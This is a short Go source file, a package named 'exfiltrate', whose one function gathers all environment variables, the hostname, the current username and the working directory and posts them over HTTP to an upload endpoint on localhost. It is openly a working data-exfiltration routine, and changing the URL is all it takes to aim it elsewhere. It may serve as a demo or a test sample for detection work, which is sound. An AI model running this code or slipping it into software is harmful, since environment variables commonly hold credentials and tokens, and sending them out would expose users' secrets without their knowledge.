package exfiltrate

import (
	"bytes"
	"net/http"
	"os"
	"os/user"
)

func ExfiltrateSensitiveData() {

	var dataToSend bytes.Buffer

	dataToSend.WriteString("Env variable:\n")
	for _, env := range os.Environ() {
		dataToSend.WriteString(env + "\n")
	}

	hostname, _ := os.Hostname()
	dataToSend.WriteString("\nHost name: " + hostname + "\n")

	currentUser, _ := user.Current()
	dataToSend.WriteString("\nCurrent user: " + currentUser.Username + "\n")

	cwd, _ := os.Getwd()
	dataToSend.WriteString("\nCurrent working dir: " + cwd + "\n")

	serverURL := "http://localhost:8080/upload"
	resp, _ := http.Post(serverURL, "text/plain", &dataToSend)
	defer resp.Body.Close()
}
